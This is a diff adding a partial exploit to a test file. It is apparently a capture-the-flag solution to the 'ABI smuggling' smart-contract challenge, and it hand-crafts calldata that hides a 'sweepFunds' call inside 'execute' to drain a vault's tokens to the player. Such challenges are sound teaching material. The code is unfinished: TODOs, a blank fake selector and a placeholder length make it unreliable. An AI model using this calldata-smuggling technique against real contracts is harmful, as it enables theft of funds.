@@ -45,6 +45,63 @@ describe('[Challenge] ABI smuggling', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        
+        //  Deployer can sweep
+        console.log(vault.interface.getSighash("sweepFunds"));
+
+        //  Player can withdraw
+        console.log(vault.interface.getSighash("withdraw"));
+
+       const attackVault = await vault.connect( player);
+       const attackToken = await token.connect(player);
+       
+
+        /**
+         * Adress will go
+         * 
+         * Function Selector: 0x00 
+         * Target: 0x04
+         * Bytes Location: 0x24
+         * Bytes Length: 0x44
+         * FS fake: 0x64
+         * FS real: 0x68
+         * actualdata: 0x72
+         */
+
+        const createInterface = (signature, methodName, arguments) => {
+            const ABI = signature;
+            const IFace = new ethers.utils.Interface(ABI);
+            const ABIData = IFace.encodeFunctionData(methodName, arguments);
+            return ABIData;
+        }
+// token recipient amount
+        const fnData = ethers.utils.hexZeroPad(attackToken.address, 32).slice(2) 
+                     + ethers.utils.hexZeroPad(player.address, 32).slice(2)
+                     + ethers.utils.hexZeroPad(VAULT_TOKEN_BALANCE, 32).slice(2);
+
+        console.log(fnData);
+        console.log(ethers.utils.hexZeroPad(attackToken.address));
+
+        const executeFs = vault.interface.getSighash("execute")
+        const target = ethers.utils.hexZeroPad(attackVault.address, 32).slice(2);
+        const bytesLocation = ethers.utils.hexZeroPad("0x68", 32).slice(2); // address of actual data
+        // TODO: fill in when actual data bytes is known
+        const bytesLength = ethers.utils.hexZeroPad("0x03", 32).slice(2)
+        const fnSelectorFake = "" //"0xd9caed12".slice(2);
+        const fnSelectorReal = "0x85fb709d".slice(2);
+        // TODO: put data
+        const payload = executeFs + target + bytesLocation + bytesLength + fnSelectorFake + fnSelectorReal + fnData;
+        console.log(payload);
+
+
+        await player.sendTransaction(
+            {
+                to: attackVault.address,
+                data: payload,
+                gasLimit: 1e6
+            }
+        )
+        
     });
 
     after(async function () {
